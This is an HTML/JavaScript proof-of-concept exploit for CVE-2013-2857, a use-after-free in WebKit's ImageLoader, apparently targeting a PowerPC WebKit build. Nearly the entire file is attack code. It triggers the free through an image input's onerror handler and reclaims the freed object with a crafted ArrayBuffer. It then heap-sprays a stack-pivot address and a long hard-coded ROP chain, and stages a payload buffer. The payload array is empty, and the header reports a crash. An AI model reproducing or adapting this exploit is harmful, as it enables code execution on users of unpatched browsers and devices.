<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash
-->
<script>
    function UaF(a) {
        var pivotAdress = 17489356;
        //5.5.2
        {
            var pivotAdressAdress = 461373440;
            //r6
        }

        var codegenAddress = 0x01800000;
        // don't change this.
        var sizeWebCoreImageLoader = 0x18;
        // don't change this.

        var _16K = 0x4000;
        var _4K = 0x1000;

        //radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
        a.type = "radio";

        //Allocate this new WebCore::ImageLoader over freed WebCore::
        var ab = new ArrayBuffer(sizeWebCoreImageLoader);
        var dv = new DataView(ab)

        /*
    0:000:x86> dt webkit!WebCore::ImageLoader
       +0x000 __VFN_table : Ptr32
       +0x004 m_client         : Ptr32 WebCore::ImageLoaderClient
       +0x008 m_image          : WebCore::CachedResourceHandle<WebCore::CachedImage>
       +0x00c m_failedLoadURL  : WTF::AtomicString
       +0x010 m_hasPendingBeforeLoadEvent : Pos 0, 1 Bit
       +0x010 m_hasPendingLoadEvent : Pos 1, 1 Bit
       +0x010 m_hasPendingErrorEvent : Pos 2, 1 Bit
       +0x010 m_imageComplete  : Pos 3, 1 Bit
       +0x010 m_loadManually   : Pos 4, 1 Bit
       +0x010 m_elementIsProtected : Pos 5, 1 Bit
    */
        //Register:r3 Adress:0x1AF35330-0x1AF35360
        dv.setUint32(0x00, 0x00000000);
        //vtable
        dv.setUint32(0x04, pivotAdressAdress);
        //m_client
        dv.setUint32(0x08, pivotAdressAdress);
        //m_image
        dv.setUint32(0x0C, 0x00000000);
        //m_failedLoadURL
        dv.setUint32(0x10, 0x00000000);
        //m_hasPendingBeforeLoadEvent
        dv.setUint32(0x14, 0x00000000);
        //padding

        var realROPChain = [0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x01043150, 0x00000000, 0x00000000, 0x00000002, 0x00000000, 0x01080274, 0x010429dc, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010418e4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x48000005, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000000, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7f84e378, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000004, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7fa3eb78, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000008, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7f66db78, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d00000c, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x38c60004, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000010, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x80a40000, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000014, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x38840004, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000018, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7c053000, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d00001c, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x4082fff4, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000020, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7f45d378, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000024, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x38c00002, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000028, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7ca53430, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d00002c, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7ca903a6, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000030, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x80a40000, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000034, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x90a30000, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000038, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x38840004, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d00003c, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x38630004, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000040, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x4200fff0, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000044, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7c21f214, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000048, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x80610004, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d00004c, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x7c6903a6, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000050, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x00000000, 0x00000000, 0x00000000, 0x4e800420, 0x00000000, 0x0101cc10, 0x00000000, 0x00000000, 0x00000000, 0x0101d8d4, 0x010375e0, 0x00000000, 0x1d000054, 0x1cfff000, 0x00000000, 0x0107dd70, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x01023f88, 0x1d000000, 0x00000000, 0x00000058, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010240b0, 0x1d000000, 0x00000000, 0x00000058, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010376c0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000058, 0x00000000, 0x0107dd70, 0x01035fc8, 0x01800000, 0x00000000, 0x1d000000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010376c0, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x01023f88, 0x01800000, 0x00000000, 0x00000058, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010240b0, 0x01800000, 0x00000000, 0x00000058, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x01031618, 0x0101cd80, 0x00020000, 0xdeadaffa, 0x1b800000, 0x1d500000, 0x00000008, 0x1cfff000, 0x00000000, 0x01800000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x01023f88, 0x1d500000, 0x00000000, 0x00020000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010240b0, 0x1d500000, 0x00000000, 0x00020000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010376c0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00020000, 0x00000000, 0x0107dd70, 0x01035fc8, 0x01800000, 0x00000000, 0x1d500000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010376c0, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x01023f88, 0x01800000, 0x00000000, 0x00020000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x010204c8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0107dd70, 0x010240b0, 0x01800000, 0x00000000, 0x00020000, 0x00000000, 0x01080274, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x01800000, ]
        var payload = []; //take me PowerPC code C++
        //Spray large ArrayBuffer with pivotAdress,  increase the spray for a bigger ROP exeuction chance (affects the position of the payload)
        var ar = new Array(0x1800 * 2);
        for (var i = 0; i < 0x1800 * 2; i++) {
            ar[i] = new DataView(new ArrayBuffer(_4K));
            for (var j = 0; j < _4K; j += 8) {
                ar[i].setFloat64(j, 0x10000000 + j);
                //filler
            }

            ar[i].setUint32(0x204, 0x0);
            ar[i].setUint32(0x018, pivotAdressAdress);
            ar[i].setUint32(0x000, pivotAdressAdress + 0x20);
            ar[i].setUint32(0x2BC, pivotAdress);
            //lwz r0, 0x4(r11) ; mtlr r0 ; mr r1, r11 ; li r3, -0x1 ; blr ;
            //r11, new stack location
            ar[i].setUint32(0x208, pivotAdressAdress + 0x300);

            //initialize this Rop Chain
            var ropCurrentOffset = 0x304;

            //start of the Rop Chain 
            realROPChain.forEach(function(element) {
                ar[i].setUint32(ropCurrentOffset, element);
                ropCurrentOffset += 4;
            });
        }
        var payloadBuffer = new DataView(new ArrayBuffer(_16K));
        payloadBuffer.setUint32(0, 3735924734);
        // Place search for value
        var curOffset = 4;
        for (var curI = 0; curI < payload.length; curI++) {
            payloadBuffer.setUint32(curOffset, payload[curI]);
            curOffset += 4;
        }

        //Use the new WebCore::ImageLoader & pivot !
        return 0;
    }
</script>
<input id="x" type="image" onerror="UaF(this);" src=""/>
